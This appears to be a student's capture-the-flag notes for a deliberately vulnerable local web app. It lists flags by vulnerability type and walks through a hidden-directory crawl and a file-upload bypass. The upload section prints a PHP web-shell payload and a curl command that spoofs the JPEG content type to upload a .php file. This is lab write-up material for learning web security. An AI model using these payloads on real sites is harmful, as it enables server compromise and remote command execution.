### Flag 00 03A944B434D5BAFF05F46C4BEDE5792551A2595574BCAFC9A6E25F67C382CCAA SERVER SIDE VALIDATION

### Flag 01 10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5 SQL INJECTION

### Flag 02 1D4855F7337C0C14B6F44946872C4EB33853F40B2D54393FBE94F49F1E19BBB0 VALIDATION-BYPASS, NEED SERVER SIDE VALIDATION

### Flag 03 0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E this one we will never know what the vulnerability was ?? click on a button i guess

### Flag 04 f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188 Referrer-Based Access Control Bypass and User-Agent Manipulation

### Flag 05 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d XSS, Cross site scripting

### Flag 06 b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 Bruteforce

### Flag 07 df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3 Weak Hash-based Authentication Bypass

### Flag 08 d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff Unprotected password file

### FLAG 09 b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 LOCAL FILE INCLUSION

### FLAG 10 F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188 SQL INJECTION

### FLAG 11 b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3

## FLAG 12 d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466

gobuster gave us robots.txt
which says to hid /whatever (already got the flag there) and /.hidden

there is a bunch of files and dir in /.hidden

tried to see if there was any meaning to the names of the dir and files but nothing
all files have a readme which taunts us like "Try again"

so we need to make a crawler, which we do and search for keyword flag and it works the first time, we could also have just removed all the few special messages
in the other readmes, or search by size but flag works

and we get

```
Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
```

in http://localhost:8080/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README

## FLAG 13 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8 SERVER SIDE VALIDATION

ADD IMAGE page

after trying a bunch of things, we can see that the server accepts .jpg files

and returns for example

```
/tmp/test.jpg succesfully uploaded.
```

however the image is not in the db we have access to through search img, not in the front page, there isn't a tmp dir we can reach
we also can't use local file inclusion to reach it

so even though the .jpg can technically be a script we could run there is nowhere we can reach it

however when uploading

```
<?php system($_GET['cmd']); ?>.jpg
```

we get back

```
/tmp/.jpg succesfully uploaded.
```

but that was not the vulnerability that we were supposed to find,

this works though

```
➜  darklyProject git:(master) ✗ curl -X POST 'http://localhost:8080/index.php?page=upload#' \
-H 'Content-Type: multipart/form-data' \
-F 'uploaded=@test.php;type=image/jpeg' \
-F 'MAX_FILE_SIZE=100000' \
-F 'Upload=Upload'
```

basically just sending the POST request with a .php file but setting the type as jpeg

and we get

```
>The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/test.php succesfully uploaded.</pre>
```
